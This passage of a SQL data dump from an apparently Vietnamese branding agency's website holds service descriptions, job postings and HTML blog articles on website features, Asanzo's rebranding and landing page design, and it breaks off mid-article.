(22, 0, 5, 'Bảo hộ thương thiệu', 'BRAND PROTECTION', 'bao-ho-thuong-thieu', 'brand-protection', '1526371790_2.jpg', '', NULL, NULL, '<p>Bảo hộ thương hiệu lu&ocirc;n l&agrave; điều cần thiết để đảm bảo an to&agrave;n thương hiệu kh&ocirc;ng bị tr&ugrave;ng lặp v&agrave; nh&acirc;n bản từ c&aacute;c đối thủ cạnh tranh.<br />&Aacute;p dung bảo vệ cũng l&agrave; một bước đi an to&agrave;n cho giao đoạn khởi động dự &aacute;n.</p>', '<p>Brand protection is always important to secure brand from being duplicated and replicated from competitors.</p>\r\n<p>Applying protection is also a safe move in the startup phase of the project.</p>', 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 0, '2018-06-15 04:18:31', '2018-06-14 21:18:31'),
(23, 0, 5, 'Ứng dụng thương hiệu', 'BRANDING APPLICATIONS', 'ung-dung-thuong-hieu', 'branding-applications', '1539655542_03.jpg', '', NULL, NULL, '<p style=\"text-align: justify;\">To&agrave;n bộ hệ thống nhận diện thương hiệu của dự &aacute;n được thiết kế theo c&aacute;c nh&oacute;m cơ bản, kh&aacute;ch h&agrave;ng điều chỉnh v&agrave; ph&ecirc; duyệt theo nh&oacute;m cho đến khi ho&agrave;n th&agrave;nh. Thiết kế ho&agrave;n chỉnh bảo gồm tất cả c&aacute;c yếu tố thiết kế về phong c&aacute;ch, m&agrave;u sắc, vật liệu, v&agrave; tư vấn kh&aacute;ch h&agrave;ng để sản xuất thực tế</p>', '<p>The design work of &nbsp;brand identity system of the project has basic categories, under which customers shall make adjustment and approval until completion. The complete package includes all the design elements in terms of style, color, materials, and customer consultation for actual production.</p>', 1, 1, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 0, '2018-10-16 02:05:43', '2018-10-15 19:05:43'),
(12, 0, 5, 'Sự khác biệt 1', 'Differentiation 1', 'su-khac-biet-1', 'differentiation-1', '1513831028_news-item-7.jpg', '', NULL, NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'su-khac-biet', 0, '2017-12-21 04:37:45', '2017-12-20 21:37:44'),
(11, 0, 5, 'Sự khác biệt 2', 'Differentiation 2', 'su-khac-biet-2', 'differentiation-2', '1513830921_news-item-6.jpg', '', NULL, NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'su-khac-biet', 0, '2017-12-21 04:37:56', '2017-12-20 21:37:56'),
(13, 0, 5, 'Sự khác biệt 3', 'Differentiation 3', 'su-khac-biet-3', 'differentiation-3', '1513831050_news-item-4.jpg', '', NULL, NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'su-khac-biet', 0, '2017-12-20 21:37:30', '2017-12-20 21:37:30'),
(14, 0, 5, 'Quan hệ cổ đông 1', 'relation 1', 'quan-he-co-dong-1', 'relation-1', '1513831182_news-item-8.jpg', '', NULL, NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'quan-he-co-dong', 0, '2017-12-20 21:39:42', '2017-12-20 21:39:42'),
(15, 0, 5, 'Quan hệ cổ đông 2', 'relation 2', 'quan-he-co-dong-2', 'relation-2', '1513831196_news-item-9.jpg', '', NULL, NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'quan-he-co-dong', 0, '2017-12-20 21:39:56', '2017-12-20 21:39:56'),
(16, 0, 5, 'quan hệ cổ đông 3', 'relation 3', 'quan-he-co-dong-3', 'relation-3', '1513831226_news-item-10.jpg', '', NULL, NULL, NULL, NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'quan-he-co-dong', 0, '2017-12-20 21:40:26', '2017-12-20 21:40:26'),
(17, 0, 5, 'TUYỂN DỤNG ACCOUNT EXECUTIVE', 'recruitment 1', 'tuyen-dung-account-executive', 'recruitment-1', '1524538793_join-3.jpg', '', 'Là người liên hệ chính cho bất kỳ những vấn đề liên quan đến khách hàng, xây dựng và duy trì mối quan hệ bền vững lâu dài với khách hàng.  Trở thành đầu mối liên hệ đáng tin cậy, đóng vai trò tư vấn cho khách hàng và đối tác.', NULL, '<p>Đang cập nhật ...</p>', NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tuyen-dung', 0, '2018-05-08 07:08:45', '2018-05-08 00:08:45'),
(18, 0, 5, 'TUYỂN DỤNG UI DESIGN', 'recruitment 2', 'tuyen-dung-ui-design', 'recruitment-2', '1524538779_join-2.jpg', '', '- Xác định trải nghiệm người dùng (UX flows) và giao diện người dùng (UI).\r\n- Phát triển và bảo trì thiết kế wireframe, mô hình mẫu (mockups), và chỉ dẫn kỹ thuật.\r\n- Tạo lập mô hình mẫu (mock-ups) cho Front-end Engineer.\r\n- Thiết kế hệ thống sản phẩm bao gồm web và mobile apps.', NULL, '<p>Đang cập nhật ...</p>', NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tuyen-dung', 0, '2018-05-08 07:04:05', '2018-05-08 00:04:05'),
(19, 0, 5, 'TUYỂN DỤNG CREATIVE DESIGN', 'CREATIVE DESIGNER', 'tuyen-dung-creative-design', 'creative-designer', '1529979196_DESIGN.jpg', '', 'Creative Designer phụ trách các dự án thiết kế sáng tạo tại công ty từ thiết kế logo, nhận diện thương hiệu, ấn phẩm quảng cáo, bao bì nhãn mác, website ...', NULL, '<h4 class=\"text-uppercase\">M&ocirc; tả C&ocirc;ng việc</h4>\r\n<div class=\"MarBot20\">\r\n<div class=\"content_fck\">\r\n<p><strong>GCO GROUP</strong>&nbsp;tuyển dụng nh&acirc;n sự vị tr&iacute; BRANDING DESIGN với những c&ocirc;ng việc ch&iacute;nh:</p>\r\n<ul>\r\n<li>Tham gia c&aacute;c dự &aacute;n x&acirc;y dựng thương hiệu cho kh&aacute;ch h&agrave;ng</li>\r\n<li>S&aacute;ng tạo logo, hệ thống nhận diện thương hiệu, bao b&igrave; nh&atilde;n m&aacute;c, chiến dịch quảng c&aacute;o, website...</li>\r\n<li>Ph&aacute;t triển &yacute; tưởng, thiết kế c&aacute;c sản phẩm in ấn, quảng c&aacute;o thương hiệu, phối m&agrave;u sản phẩm, catalogue, tờ rơi, POSM...</li>\r\n</ul>\r\n</div>\r\n</div>\r\n<div class=\"MarBot20\">\r\n<h4 class=\"TitleJobNew\">Y&ecirc;u Cầu C&ocirc;ng Việc</h4>\r\n<div class=\"content_fck\">\r\n<ul>\r\n<li>Tốt nghiệp đại học chuy&ecirc;n ng&agrave;nh thiết kế đồ họa, mỹ thuật</li>\r\n<li>Th&agrave;nh thạo c&aacute;c phần mềm thiết kế: ILLUSTRATOR, PHOTOSHOP...</li>\r\n<li>Khả năng vẽ tay v&agrave; vẽ Wacom</li>\r\n<li>Đ&atilde; c&oacute; kinh nghiệm l&agrave;m thiết kế nhận diện thương hiệu</li>\r\n<li>Chủ động về &yacute; tưởng, khả năng s&aacute;ng tạo, thẩm mỹ tốt.</li>\r\n<li>C&oacute; khả năng l&agrave;m việc theo nh&oacute;m v&agrave; chịu &aacute;p lực cao.</li>\r\n<li>C&aacute;ch l&agrave;m việc chuy&ecirc;n nghiệp, cẩn thận v&agrave; c&oacute; tr&aacute;ch nhiệm.</li>\r\n<li>Ưu ti&ecirc;n ứng vi&ecirc;n c&oacute; khả năng sử dụng tiếng Anh. ( phục vụ việc tra cứu mở rộng cho c&aacute;c c&ocirc;ng việc s&aacute;ng tạo).</li>\r\n</ul>\r\n<p>&nbsp;</p>\r\n<p>QUYỀN LỢI</p>\r\n<ul>\r\n<li>Lương ch&iacute;nh thức:&nbsp;<strong>8-10 triệu&nbsp;</strong></li>\r\n<li>Chế độ BHXH, BHYT đối với nh&acirc;n vi&ecirc;n ch&iacute;nh thức gắn b&oacute; l&acirc;u d&agrave;i.</li>\r\n<li>Chế độ ph&uacute;c lợi đầy đủ d&agrave;nh cho nh&acirc;n vi&ecirc;n.</li>\r\n<li>Được hỗ trợ tối đa từ c&aacute;c ph&ograve;ng ban c&oacute; li&ecirc;n quan.</li>\r\n<li>Được tham gia c&aacute;c hoạt động thường ni&ecirc;n của c&ocirc;ng ty ( Du lịch, Du xu&acirc;n &hellip;), event (Miss GCO, GCO&rsquo;s got talent, Trạng Nguy&ecirc;n, Sing my song,&hellip;).</li>\r\n<li>Được l&agrave;m việc trong m&ocirc;i trường chuy&ecirc;n nghiệp, năng động, th&acirc;n thiện.</li>\r\n<li>C&oacute; cơ hội trở th&agrave;nh c&aacute;c vị tr&iacute; quản l&yacute; như trưởng nh&oacute;m, trưởng ph&ograve;ng&hellip;</li>\r\n<li>C&oacute; cơ hội tham gia g&oacute;p vốn trong c&aacute;c dự &aacute;n mới của c&ocirc;ng ty</li>\r\n</ul>\r\n<p>&nbsp;</p>\r\n<p>LI&Ecirc;N HỆ</p>\r\n<p>Điện thoại:<strong> 090 216 6747<br /></strong>Email: tuyendung@gco.com.vn</p>\r\n</div>\r\n</div>', '<p>Creative Designer is responsible for the creative design project of the company including logo design, brand identity, advertising publication, packaging label, website ...</p>', 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tuyen-dung', 0, '2018-06-26 02:17:40', '2018-06-25 19:17:40'),
(34, 0, 5, 'Một vài tính năng trên website doanh nghiệp nhỏ mà bạn cần biết', 'Một vài tính năng trên website doanh nghiệp nhỏ mà bạn cần biết', 'mot-vai-tinh-nang-tren-website-doanh-nghiep-nho-ma-ban-can-biet', 'mot-vai-tinh-nang-tren-website-doanh-nghiep-nho-ma-ban-can-biet', '1539781626_1.jpg', '', 'Bất cứ doanh nghiệp nào đều cần sử dụng các hình thức marketing online để quảng bá thêm', NULL, '<p style=\"text-align: justify;\">Bất cứ doanh nghiệp n&agrave;o đều cần sử dụng c&aacute;c h&igrave;nh thức marketing online để quảng b&aacute; th&ecirc;m cho doanh nghiệp của m&igrave;nh, đ&acirc;y cũng l&agrave; h&igrave;nh thức quảng b&aacute; kh&ocirc;ng c&ograve;n xa lạ ở hầu hết c&aacute;c doanh nghiệp hiện nay, đảm bảo cho việc quảng b&aacute; h&igrave;nh ảnh c&agrave;ng th&ecirc;m dễ d&agrave;ng v&agrave; th&agrave;nh c&ocirc;ng hơn hẳn.</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&iacute;nh v&igrave; vậy việc thiết lập t&iacute;nh năng quảng b&aacute; doanh nghiệp tr&ecirc;n website đang ng&agrave;y c&agrave;ng trở n&ecirc;n thiết yếu. Dưới đ&acirc;y&nbsp; l&agrave; một v&agrave;i t&iacute;nh năng cần c&oacute; tr&ecirc;n website doanh nghiệp để tăng cường khả năng quảng b&aacute; doanh nghiệp m&agrave; bạn cần t&igrave;m hiểu.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. Thiết&nbsp; kế thanh menu r&otilde; r&agrave;ng đảm bảo độ th&iacute;ch nghi cao</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Một trong những ch&uacute; &yacute; đầu ti&ecirc;n khi thiết kế website cho doanh nghiệp l&agrave; cần đảm bảo thiết kế thanh menu r&otilde; r&agrave;ng, cam kết độ th&iacute;ch nghi cao để đảm bảo kh&aacute;ch h&agrave;ng khi truy cập v&agrave;o website cũng dễ d&agrave;ng v&agrave; đơn giản hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Trong đ&oacute; website doanh nghiệp cũng cần đảm bảo c&oacute; thể th&iacute;ch nghi đươc với mọi thiết bị truy cập của kh&aacute;ch h&agrave;ng, từ đ&oacute; cam kết được sự th&iacute;ch nghi cũng như tối ưu nhất với&nbsp; website doanh nghiệp, đảm bảo t&iacute;nh tiện dụng cho kh&aacute;ch h&agrave;ng v&agrave; tăng cường lượt truy cập của kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/2.jpg\" alt=\"\" width=\"1000\" height=\"568\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Đ&acirc;y cũng l&agrave; l&yacute; do khi thiết kế website doanh nghiệp ch&uacute;ng ta chỉ cần đảm bảo được độ th&iacute;ch nghi cao của website th&igrave; ch&iacute;nh website doanh nghiệp sẽ tự đồng điều chỉnh được độ th&iacute;ch nghi của web sao cho ph&ugrave; hợp với thiết bị truy cập của kh&aacute;ch h&agrave;ng nhất, từ đ&oacute; c&oacute; thể phục vụ được tối ưu mọi nhu cầu của kh&aacute;ch h&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Bạn c&oacute; thể thấy rằng với&nbsp; những website c&oacute; thể tự điều chỉnh sao cho ph&ugrave; hợp với thiết bị bạn đang sử dụng bao giờ cũng dễ d&agrave;ng phục vụ được những nhu cầu tối ưu của mọi kh&aacute;ch h&agrave;ng, trong đ&oacute; bao gồm cả việc truy cập v&agrave;o c&aacute;c thiết bị kh&aacute;c&nbsp; như điện thoại, m&aacute;y t&iacute;nh đều cần đảm bảo sự thay đổi v&agrave; th&iacute;ch nghi kh&aacute;c nhau.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">B&ecirc;n cạnh đ&oacute; website doanh nghiệp cũng cần đảm bảo c&oacute; bố cục r&otilde; r&agrave;ng v&agrave; mạch lạc, tuyệt đối kh&ocirc;ng l&agrave;m rối mắt người d&ugrave;ng, từ&nbsp; đ&oacute; đảm bảo kh&aacute;ch h&agrave;ng c&oacute; thể sử dụng thuận tiện v&agrave; thu h&uacute;t được nhiều người d&ugrave;ng hơn.</span></p>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Cam kết c&aacute;c yếu tố SEO tr&ecirc;n website</span></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tất nhi&ecirc;n với bất cứ một website doanh nghiệp n&agrave;o cũng đều cần cam kết c&aacute;c yếu tố SEO tr&ecirc;n website phải được tối ưu h&oacute;a hơn, ch&iacute;nh v&igrave; vậy việc thiết kế SEO cũng như chạy SEO cần đảm bảo tốt, cam kết website phải c&oacute; lượng truy cập cao, nội dung cần cung cấp đầy đủ, từ kh&oacute;a phổ th&ocirc;ng để tăng cường t&iacute;nh quảng b&aacute; cho doanh nghiệp, gia tăng hiệu quả kinh doanh.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/2_1.png\" alt=\"\" width=\"1024\" height=\"503\" /></span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">3. Ch&uacute; &yacute; tương t&aacute;c với kh&aacute;ch h&agrave;ng</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tất nhi&ecirc;n website doanh nghiệp để th&agrave;nh c&ocirc;ng cần đảm bảo được t&iacute;nh tương t&aacute;c với kh&aacute;ch h&agrave;ng ph&ugrave; hợp, ch&iacute;nh v&igrave; vậy việc quan t&acirc;m v&agrave;&nbsp; ch&uacute; &yacute; để kh&aacute;ch h&agrave;ng truy cập v&agrave;o website, c&oacute; sẵn c&ocirc;ng cụ để giải đ&aacute;p thắc mắc kh&aacute;ch h&agrave;ng nhanh nhất lu&ocirc;n l&agrave; điều cần thiết.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Với việc n&agrave;y ch&uacute;ng ta chỉ cần d&ugrave;ng mục th&ocirc;ng tin, chương tr&igrave;nh khuyến mại hoặc giải đ&aacute;p tư vấn ngay tr&ecirc;n website sẽ thu h&uacute;t&nbsp; được nhiều kh&aacute;ch h&agrave;ng hơn, c&oacute; sẵn giải th&iacute;ch sản phẩm, c&ocirc;ng cụ hỗ trợ trực tuyến, bản tin&hellip;. L&agrave; yếu tố quan trọng cần c&oacute; trong website của bạn.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">4. Đảm bảo t&iacute;nh bảo mật th&ocirc;ng tin cho kh&aacute;ch h&agrave;ng</span></strong></h2>\r\n<p style=\"text-align: center;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/3.jpg\" alt=\"\" width=\"1000\" height=\"755\" /></span></strong></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">T&iacute;nh bảo mật th&ocirc;ng tin cho kh&aacute;ch h&agrave;ng cũng l&agrave; ti&ecirc;u ch&iacute; cần nắm r&otilde; khi thiết kế website, trong đ&oacute; website doanh nghiệp phải đảm bảo an to&agrave;n, c&oacute; t&iacute;nh bảo mật đ&aacute;ng tin cậy nhằm rao b&aacute;n sản phẩm nhiều hơn.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Để l&agrave;m được điều n&agrave;y th&igrave; bạn c&oacute; thể sử dụng c&aacute;c h&igrave;nh thức m&atilde; h&oacute;a như SSL, VeriSign, Trust E, Entrust, GeoTrust,&hellip; để bảo vẹ trang web của bạn được tốt hơn.</span></p>\r\n<p style=\"text-align: justify;\">&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/3.png\" alt=\"\" width=\"1999\" height=\"1011\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;</span></p>', NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 0, '2018-10-17 13:53:58', '2018-10-17 06:53:58'),
(35, 0, 5, 'Tại sao ông trùm ngành điện tử Asanzo tiến hành tái định vị thương hiệu ?', NULL, 'tai-sao-ong-trum-nganh-dien-tu-asanzo-tien-hanh-tai-dinh-vi-thuong-hieu', '', '1539772490_3.jpg', '', 'Việc thay đổi và tái định vị thương hiệu của ông trùm ngành điện tử Asanzo', NULL, '<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Việc thay đổi v&agrave; t&aacute;i định vị thương hiệu của &ocirc;ng tr&ugrave;m ng&agrave;nh điện tử Asanzo mới đ&acirc;y đ&atilde; g&acirc;y sốt sắng kh&ocirc;ng &iacute;t trong ng&agrave;nh điện tử, trong đ&oacute; với quyết định t&aacute;i định vị thương hiệu của m&igrave;nh của &ocirc;ng tr&ugrave;m Asanzo đ&atilde; b&aacute;o trước cho một kế hoạch ph&aacute;t triển mạnh mẽ v&agrave; đẩy mạnh gi&aacute; trị thương hiệu của doanh nghiệp.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">1. T&igrave;m hiểu th&ecirc;m về tập đo&agrave;n Asanzo</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Tập đo&agrave;n Asanzo được th&agrave;nh lập khởi điểm từ năm 2013 với số vốn khổng lồ l&ecirc;n đến 20 triệu USD tại th&agrave;nh phố HCM. H&atilde;ng điện tử n&agrave;y xuất hiện chỉ sau 11 năm đ&atilde; g&acirc;y sức h&uacute;t kh&ocirc;ng nhỏ tr&ecirc;n thị trường với con số ti&ecirc;u thụ khổng lồ tới 670 tỷ đồng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Thời gian sau đ&oacute; tập đo&agrave;n vẫn kh&ocirc;ng ngừng tăng trường gần 2 lần qua mỗi năm, bao gồm cả doanh thu lẫn sản phẩm cung ứng.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/asanzo-se-xay-dung-nha-may-moi-o-cu-chi-tphcm1513211536.jpg\" alt=\"\" width=\"600\" height=\"450\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Cho tới năm 2017, đơn vị n&agrave;y đ&atilde; thu được doanh thu l&ecirc;n tới 4.620 tỷ đồng cho to&agrave;n bộ c&aacute;c ng&agrave;nh h&agrave;ng điện tử, điện lạnh, điện gia dụng v&agrave; smarphone.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Theo như chia sẻ của &ocirc;ng chủ Asanzo Phạm Văn Tam cũng cho biết, trong thời gian 5 năm tới, định hướng của doanh nghiệp l&agrave; sẽ đạt được doanh thu 10.000 tỷ đồng mỗi năm, ph&aacute;t triển vững mạnh trở th&agrave;nh tập đo&agrave;n c&ocirc;ng nghệ h&agrave;ng đầu Việt Nam.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">2. Điều g&igrave; khiến Asanzo muốn t&aacute;i định vị thương hiệu ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Trong nhận thức của c&aacute;c &ocirc;ng tr&ugrave;m Asanzo cho biết, việc t&aacute;i định vị thương hiệu l&agrave; bước đệm quan trọng cho kế hoạch ph&aacute;t triển vững mạnh v&agrave; bứt ph&aacute; của doanh nghiệp trong qu&atilde;ng thời gian tới, bởi logo c&ugrave;ng bộ nhận diện thương hiệu đ&oacute;ng vai tr&ograve; quan trọng trong ph&aacute;t triển doanh nghiệp, gi&uacute;p người d&ugrave;ng ghi nhớ dễ d&agrave;ng hơn hẳn.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/11_6.jpg\" alt=\"\" width=\"1920\" height=\"1080\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">C&oacute; thể n&oacute;i chiến dịch t&aacute;i định vị thương hiệu của Asanzo th&ocirc;ng qua logo c&ugrave;ng bộ nhận diện thương hiệu kh&ocirc;ng chỉ x&acirc;y dựng thương hiệu doanh nghiệp vững chắc, chứng tỏ bản quyền của doanh nghiệp tới từng sản phẩm m&agrave; c&ograve;n l&agrave; nền m&oacute;ng đ&aacute;nh dấu cho sự ph&aacute;t triển c&ugrave;ng những bước tiến d&agrave;i của doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Ch&iacute;nh sự thay đổi về logo c&ugrave;ng bộ nhận diện thương hiệu của Asanzo c&oacute; thể đảm bảo ph&ugrave; hợp với mục ti&ecirc;u c&ugrave;ng tầm nh&igrave;n của doanh nghiệp trong giai đoạn mới, tạo dấu ấn mới mạnh mẽ hơn cho thương hiệu c&ugrave;ng sản phẩm, tăng cường sức lan tỏa của thương hiệu v&agrave; g&oacute;p phần gi&uacute;p gia tăng doanh thu của doanh nghiệp.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">3.&nbsp;Nh&shy;ững y&ecirc;u cầu t&aacute;i định vị thương hiệu của&nbsp;Asanzo&nbsp; ?</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">L&agrave; đơn vị đi đầu trong ng&agrave;nh thương mại điện tử, Asanzo khi muốn t&aacute;i định vị thương hiệu lu&ocirc;n y&ecirc;u cầu tối ưu cao về sự s&aacute;ng tạo, tinh tế v&agrave; dễ nhớ, đảm bảo tiếp cận người d&ugrave;ng nhanh ch&oacute;ng nhất, tạo được ấn tượng mạnh mẽ với người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif;\"><span style=\"font-size: 18.6667px;\">Đặc biệt với thương hiệu nổi tiếng như&nbsp;Asanzo khi t&aacute;i định vị thương hiệu lu&ocirc;n cần nghi&ecirc;n cứu v&agrave; khảo s&aacute;t thị trường, tham khảo nhu cầu v&agrave; mong muốn của người d&ugrave;ng, từ đ&oacute; c&oacute; thể t&aacute;i định vị thương hiệu mới ph&ugrave; hợp với người d&ugrave;ng nhất, ghi lại ấn tượng mạnh mẽ trong l&ograve;ng người d&ugrave;ng.</span></span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\"><img src=\"http://brity.vn/upload/12_5.jpg\" alt=\"\" width=\"1200\" height=\"797\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">Những thiết kế&nbsp;thương hiệu mới của&nbsp;Asanzo y&ecirc;u cầu&nbsp;phải&nbsp;đảm bảo ti&ecirc;u ch&iacute; đơn giản, khắc s&acirc;u, ph&ugrave; hợp với từng d&ograve;ng mặt h&agrave;ng cụ thể, đảm bảo g&acirc;y ấn tượng mạnh mẽ với người ti&ecirc;u d&ugrave;ng tr&ecirc;n từng d&ograve;ng sản phẩm, mang lại một l&agrave;n gi&oacute; mới mạnh mẽ cho doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">C&oacute; thể n&oacute;i, việc chọn lựa t&aacute;i định vị thương hiệu gi&uacute;p Asanzo c&oacute; thể nhanh ch&oacute;ng định vị được thương hiệu tr&ecirc;n thị trường, dễ d&agrave;ng đi v&agrave;o l&ograve;ng người d&ugrave;ng v&agrave; tạo được sự gắn kết l&acirc;u d&agrave;i, bền chắc giữa người d&ugrave;ng với doanh nghiệp.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 14pt;\">&nbsp;</span></p>', NULL, 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 0, '2018-10-17 13:52:47', '2018-10-17 06:52:47'),
(29, 0, 5, 'Bạn biết gì về thiết kế Website Landing Page ?', 'What Do You Know About Website Designing Landing Page?', 'ban-biet-gi-ve-thiet-ke-website-landing-page', 'what-do-you-know-about-website-designing-landing-page', '1539787604_28.jpg', '', 'Có thể nói thiết kế Website Landing Page chính là khái niệm vô cùng quen thuộc trong lĩnh vực thiết kế website', NULL, '<p style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">C&oacute; thể n&oacute;i <em><u>thiết kế Website Landing Page</u></em> ch&iacute;nh l&agrave; kh&aacute;i niệm v&ocirc; c&ugrave;ng quen thuộc trong lĩnh vực thiết kế website, đặc biệt với những doanh nghiệp, đơn vị kinh doanh nếu muốn thu h&uacute;t kh&aacute;ch h&agrave;ng, x&acirc;y dựng uy t&iacute;n với người d&ugrave;ng v&agrave; kh&aacute;ch h&agrave;ng th&igrave; việc phải c&oacute; một website đẹp, chuy&ecirc;n nghiệp l&agrave; hết sức cần thiết.</span></strong></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Đ&acirc;y cũng l&agrave; l&yacute; do hầu hết c&aacute;c doanh nghiệp c&ugrave;ng c&aacute;c đơn vị kinh doanh đều cần t&igrave;m tới những đơn vị thiết kế Website Landing Page chuy&ecirc;n nghiệp v&agrave; uy t&iacute;n để ho&agrave;n thiện website của m&igrave;nh thu h&uacute;t nhất.</span></p>\r\n<h2 style=\"text-align: justify;\"><strong><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">1. T&igrave;m hiểu sơ lược về website Landing Page</span></strong></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Website Landing Page thực chất ch&iacute;nh l&agrave; một trang web c&oacute; giao diện c&ugrave;ng nội dung như trang web b&igrave;nh thường, tuy nhi&ecirc;n đơn giản hơn trang web b&igrave;nh thường l&agrave; nội dung của n&oacute; chỉ tập trung v&agrave;o một mảng, kh&iacute;a cạnh nhất định, c&oacute; thể l&agrave; chiến dịch kinh doanh, sản phẩm mới, dịch vụ mới, sự kiện&hellip;.. của doanh nghiệp đ&oacute;.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\"><img src=\"http://brity.vn/upload/5.png\" alt=\"\" width=\"800\" height=\"600\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Mục đ&iacute;ch của c&aacute;c trang website Landing Page ch&iacute;nh l&agrave; thu h&uacute;t nhiều lượt xem của kh&aacute;ch h&agrave;ng, k&iacute;ch th&iacute;ch h&agrave;nh vi mua h&agrave;ng của người d&ugrave;ng, th&ocirc;ng qua đ&oacute; người d&ugrave;ng cũng nhận được nhiều th&ocirc;ng tin hơn, l&ocirc;i k&eacute;o người d&ugrave;ng v&agrave;o xem website v&agrave; tạo ấn tượng với người d&ugrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 14pt; font-family: \'times new roman\', times, serif;\">Để l&agrave;m được điều n&agrave;y th&igrave; việc 